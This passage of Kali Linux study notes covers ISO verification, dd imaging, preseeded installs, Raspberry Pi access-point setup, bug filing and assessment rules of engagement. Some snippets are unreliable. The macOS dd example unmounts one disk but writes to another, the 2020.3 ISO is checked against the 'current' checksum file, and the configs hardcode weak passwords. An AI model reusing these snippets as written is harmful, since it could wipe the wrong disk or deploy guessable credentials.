wget https://cdimage.kali.org/kali-2020.3/kali-linux-2020.3-live-amd64.iso

# Import GPG key
wget -q -O - https://archive.kali.org/archive-key.asc | gpg --import
gpg --keyserver hkps://keys.openpgp.org --recv-key 44C6513A8E4FB3D30875F758ED444FF07D8D0BF6

# Verify fingerprint
gpg --fingerprint 44C6513A8E4FB3D30875F758ED444FF07D8D0BF6
# 44C6 513A 8E4F B3D3 0875  F758 ED44 4FF0 7D8D 0BF6

# Download checksums
wget https://cdimage.kali.org/current/SHA256SUMS
wget https://cdimage.kali.org/current/SHA256SUMS.gpg

# Verify signature
gpg --verify SHA256SUMS.gpg SHA256SUMS

# Verify ISO
grep kali-linux-2020.3-live-amd64.iso SHA256SUMS | sha256sum -c
```

---

## 38. Write ISO to USB

```bash
lsblk
sudo dmesg | tail -20
sudo umount /dev/sdb1
sudo dd if=kali-linux-2020.3-live-amd64.iso of=/dev/sdb bs=1M status=progress
sync

# macOS raw device (faster)
diskutil unmountDisk /dev/disk6
sudo dd if=kali-linux-2020.3-live-amd64.iso of=/dev/rdisk2 bs=4m
diskutil eject /dev/disk6
```

---

## 39. Boot Options

| Option | Purpose |
|---|---|
| Live | Standard live boot |
| Live (amd64 failsafe) | Minimal drivers |
| Live (forensics mode) | No auto-mount, no writes |
| Live USB Persistence | Retains changes |
| Live USB Encrypted Persistence | Encrypted storage |
| Start installer | Text-mode install |
| Hardware Detection Tool | Low-level info |
| Memory Diagnostic | RAM testing |

**Edit boot params:** `Tab` (syslinux) or `e` (GRUB). Remove `quiet` for verbose.

**Forensics mode params:** `noswap`, `noautomount`

---

## 40. Forensics Mode Verification

```bash
mount | grep -v "proc\|sys\|dev\|run\|tmpfs"
lsblk
cat /proc/mounts
md5sum /dev/sda
sha256sum /dev/sda
```

---

## 41. Live Mode Persistence Failure

```bash
sudo dd if=/dev/zero of=/home/kali/test.img bs=4M count=6144
# "No space left on device" — writing to RAM
# Reboot → file gone
```

---

## 42. Installation: Preseeding

**Boot parameters:**
```
language=en
hostname=kali
domain=local.lan
keymap=us
locale=en_US
```

**Network preseed:**
```
preseed/url=https://server/preseed.cfg
auto=true priority=critical
```

**Preseed format:**
```
d-i mirror/suite string kali-rolling
```

| Field | Meaning |
|---|---|
| d-i | Owner |
| mirror/suite | Question ID |
| string | Type |
| kali-rolling | Value |

**Generate:**
```bash
debconf-get-selections --installer > preseed.cfg
```

**Example:**
```
d-i debian-installer/locale string en_US
d-i keyboard-configuration/xkb-keymap select us
d-i netcfg/choose_interface select auto
d-i netcfg/get_hostname string kali
d-i netcfg/get_domain string local.lan
d-i mirror/country string manual
d-i mirror/http/hostname string http.kali.org
d-i mirror/http/directory string /kali
d-i mirror/http/proxy string
d-i clock-setup/utc boolean true
d-i time/zone string UTC
d-i passwd/user-fullname string Kali User
d-i passwd/username string kali
d-i passwd/user-password password kali
d-i passwd/user-password-again password kali
d-i partman-auto/method string regular
d-i partman-auto/choose_recipe select atomic
d-i partman-partitioning/confirm_write_new_label boolean true
d-i partman/choose_partition select finish
d-i partman/confirm boolean true
tasksel tasksel/first multiselect standard
d-i pkgsel/include string openssh-server
d-i grub-installer/only_debian boolean true
d-i grub-installer/with_other_os boolean true
d-i finish-install/reboot_in_progress note
```

---

## 43. ARM Installation

```bash
wget https://www.offsec.com/kali-linux-arm-images/kali-linux-2020.3-rpi3-nexmon.img.xz
sha256sum kali-linux-2020.3-rpi3-nexmon.img.xz
unxz kali-linux-2020.3-rpi3-nexmon.img.xz
lsblk
sudo dmesg | tail -20
sudo dd if=kali-linux-2020.3-rpi3-nexmon.img of=/dev/sdb bs=1M status=progress
sync

# Post-boot
passwd
sudo rm /etc/ssh/ssh_host_*
sudo dpkg-reconfigure openssh-server
```

### ARM Chroot
```bash
sudo apt install qemu qemu-user qemu-user-static
sudo mkdir /mnt/sd
sudo mount /dev/sdc2 /mnt/sd/
sudo mount -t proc none /mnt/sd/proc
sudo mount -t sysfs none /mnt/sd/sys
sudo mount -o bind /dev /mnt/sd/dev
sudo mount -o bind /dev/pts /mnt/sd/dev/pts
sudo cp /usr/bin/qemu-arm-static /mnt/sd/usr/bin
sudo LANG=C chroot /mnt/sd/

# Inside
apt update
apt install mlocate net-tools hostapd dnsmasq
exit

# Cleanup
sudo umount /mnt/sd/dev/pts
sudo umount /mnt/sd/dev
sudo umount /mnt/sd/sys
sudo umount /mnt/sd/proc
sudo umount /mnt/sd
```

---

## 44. Installer Troubleshooting

| Key | Console | Contents |
|---|---|---|
| Ctrl+Alt+F1 | 1 | Text installer |
| Ctrl+Alt+F2 | 2 | Shell |
| Ctrl+Alt+F3 | 3 | Shell |
| Ctrl+Alt+F4 | 4 | **Log output** |
| Ctrl+Alt+F5 | 5 | Graphical installer |

```bash
cat /var/log/syslog
debconf-get
debconf-set
nano /target/etc/...
```

Target filesystem: `/target`

---

## 45. Hardware Discovery

```bash
sudo dmesg | grep CPU0:
lspci | grep Ethernet
lspci | grep VGA
uname -r
free -h
df -h
lsusb
lsblk
```

---

## 46. Wireless Access Point (hostapd + dnsmasq)

**Packages:**
```bash
sudo apt install dnsmasq hostapd dhcpcd5
```

**`/etc/dhcpcd.conf`:**
```
denyinterfaces wlan0
```

**`/etc/network/interfaces`:**
```
allow-hotplug wlan0
iface wlan0 inet static
    address 172.24.1.1
    netmask 255.255.255.0
    network 172.24.1.0
    broadcast 172.24.1.255
```

```bash
sudo service dhcpcd restart
sudo ifdown wlan0; sudo ifup wlan0
```

**`/etc/hostapd/hostapd.conf`:**
```
interface=wlan0
driver=nl80211
ssid=Kali-Pi3
hw_mode=g
channel=6
ieee80211n=1
wmm_enabled=1
ht_capab=[HT40][SHORT-GI-20][DSSS_CCK-40]
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=raspberrytoor
rsn_pairwise=CCMP
```

```bash
sudo /usr/sbin/hostapd /etc/hostapd/hostapd.conf
```

**`/etc/default/hostapd`:**
```
DAEMON_CONF="/etc/hostapd/hostapd.conf"
```

**`/etc/dnsmasq.conf`:**
```
interface=wlan0
listen-address=172.24.1.1
bind-interfaces
server=8.8.8.8
domain-needed
bogus-priv
dhcp-range=172.24.1.50,172.24.1.150,12h
```

**IP forwarding + NAT:**
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables-save | sudo tee /etc/iptables.ipv4.nat
```

**`/etc/rc.local`:**
```bash
#!/bin/sh -e
iptables-restore < /etc/iptables.ipv4.nat
```

```bash
sudo chmod 711 /etc/rc.local
sudo systemctl start hostapd dnsmasq
sudo systemctl enable hostapd dnsmasq
```

---

## 47. Config File Locations

| Service | Config |
|---|---|
| Network (ifupdown) | `/etc/network/interfaces` |
| Network (systemd) | `/etc/systemd/network/*.network` |
| Network (NM) | `/etc/NetworkManager/NetworkManager.conf` |
| Users | `/etc/passwd`, `/etc/shadow` |
| Groups | `/etc/group`, `/etc/gshadow` |
| Adduser | `/etc/adduser.conf` |
| SSH server | `/etc/ssh/sshd_config` |
| SSH host keys | `/etc/ssh/ssh_host_*` |
| PostgreSQL | `/etc/postgresql/*/main/` |
| Apache | `/etc/apache2/` |
| systemd units | `/lib/systemd/system/`, `/etc/systemd/system/` |
| iptables | `/usr/local/etc/*.fw` |
| logcheck | `/etc/logcheck/` |
| AIDE | `/etc/aide/aide.conf` |
| Tripwire | `/etc/tripwire/twpol.txt` |

---

## 48. Bug Filing Decision Tree

```
Bug found
    │
    ▼
Determine package owner (dpkg -S /path)
    │
    ▼
Does version contain "kali"?
    │
    ├── Yes → File in Kali tracker
    │
    └── No → Reproduce in plain Debian Testing VM
            │
            ├── Reproduces → File in Debian tracker
            │
            └── Doesn't reproduce → File in Kali
```

---

## 49. Bug Severity (Debian)

| Level | Meaning |
|---|---|
| critical | Breaks unrelated software, data loss, security hole |
| grave | Package unusable, data loss, account compromise |
| serious | Violates Debian policy "must" |
| important | Major usability impact |
| does-not-build | Fails to build from source |
| normal | Specific option/menu item problem |
| minor | Spelling, cosmetic |
| wishlist | Feature requests |

---

## 50. Assessment Rules of Engagement

| Item | Question |
|---|---|
| Scope | What systems? |
| Time window | When? |
| Exploitation | Allowed? Approval process? |
| Critical findings | Report immediately or at end? |
| Emergency contact | Who? |
| Awareness | Who knows? Testing detection? |
| Deliverable | Format? Detail? |

**Scope validation:** Confirm ownership, cloud provider permission, IP block ownership. Use OSINT tools.
